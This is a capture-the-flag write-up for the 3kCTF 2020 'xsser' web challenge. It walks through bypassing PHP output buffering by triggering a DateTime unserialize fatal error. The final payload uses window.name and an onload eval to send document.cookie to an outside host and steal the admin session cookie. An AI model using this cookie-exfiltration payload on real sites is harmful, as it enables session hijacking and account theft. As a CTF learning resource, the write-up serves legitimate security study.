# 3kCTF 2020: xsser

### (Web, 499 pts, 4 solves)

Description
> challenge

> Author: Dali

## Walkthrough

Source code is provided:

```
<?php
include('flag.php');
class User

{
    public $name;
    public $isAdmin;
    public function __construct($nam)
    {
        $this->name = $nam;
        $this->isAdmin=False;
    }
}

ob_start();
if(!(isset($_GET['login']))){
    $use=new User('guest');
    $log=serialize($use);
    header("Location: ?login=$log");
    exit();

}

$new_name=$_GET['new'];
if (isset($new_name)){


  if(stripos($new_name, 'script'))//no xss :p 
                 { 
                    $new_name = htmlentities($new_name);
                 }
        $new_name = substr($new_name, 0, 32);
  echo '<h1 style="text-align:center">Error! Your msg '.$new_name.'</h1><br>';
  echo '<h1>Contact admin /req.php </h1>';

}
 if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
            setcookie("session", $flag, time() + 3600);
        }
$check=unserialize(substr($_GET['login'],0,56));
if ($check->isAdmin){
    echo 'welcome back admin ';
}
ob_end_clean();
show_source(__FILE__);
```

From the challenge name it is about XSS. After setting `$_GET['login']`, you can enter something in `$_GET['new']`, which is supposed to be reflected on the page for XSS.

Thanks to `ob_start();` and `ob_end_clean();`, nothing about the user input are printed in the normal case.

To address this, we can make the interpreter panic before `ob_end_clean();`.  Maybe `unserialize` could do so? 

But most of the time `unserialize` just returns FALSE when you input some garbage that is "un-unserialize-able" (pun intended)

Let's try to unserialize some meaningful junks:

```
<?php
foreach (get_declared_classes() as $c) {
	unserialize('O:'.strlen($c).':"'.$c.'":0:{}');
}
```

It shows `Fatal error: Uncaught Error: Invalid serialization data for DateTime object`. So `DateTime` should do the trick.

How about the actual XSS payload? We can't use `<script src=//blah></script>`. 

For some reason `script<script src=//blah></script>` could bypass that `stripos` but it is too long.

Later on I found that `/req.php` accepts external URLs as well. So we can use some other tricks like `window.name`:

```
<script>name='location="//blah/"+document.cookie';location='//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E&login=O:8:%22DateTime%22:0:%7B%7D';</script>
```
---
## Remarks

At first I tried the payload with iframe but Chrome blocks the `Set-Cookie` header due to "third-party cookies preference".

Then I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.
